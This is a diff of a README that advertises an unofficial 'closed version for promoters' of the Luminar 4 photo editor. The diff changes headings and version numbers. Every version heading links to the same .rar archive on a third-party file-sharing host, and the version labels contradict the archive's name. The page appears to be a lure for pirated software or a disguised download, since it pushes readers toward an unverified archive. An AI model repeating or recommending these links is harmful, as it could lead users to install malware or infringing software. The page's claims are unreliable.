@@ -1,4 +1,4 @@
-# **Luminar4 Full Versions**
+# **Luminar4 Adv Versions**
 -------------
 ![alt-текст](https://images-na.ssl-images-amazon.com/images/I/8163qVOTUPL._AC_SY445_.jpg "Luminar4")
 # Closed version for promoters.
@@ -14,7 +14,7 @@
 
 ## Luminar 4's revolutionary tools and AI technologies give superpowers for creative photo editing.
 
-## [⚡Luminar Version 4.2](http://trainbit.com/files/9439988484/Luminar_4.3_(adv).rar):
+## [⚡Luminar Version 4.3](http://trainbit.com/files/9439988484/Luminar_4.3_(adv).rar):
 * NEW AI Augmented Sky Tool.
 * Face Features Detection Network.
 * Shine Removal Technology.
@@ -23,7 +23,7 @@
 * Improvements to ML Cache.
 * Third-party Plugin Implementation (PC users).
 
-## [⚡Luminar Version 4.1](http://trainbit.com/files/9439988484/Luminar_4.3_(adv).rar):
+## [⚡Luminar Version 4.2](http://trainbit.com/files/9439988484/Luminar_4.3_(adv).rar):
 
 * Support for two new Crop Aspect Ratios: 21:9 and 9:21. These are well suited for extra wide-screen computer displays, and digital cinema uses.
 * Resetting tools is easier with an increased clickable area for each reset button.
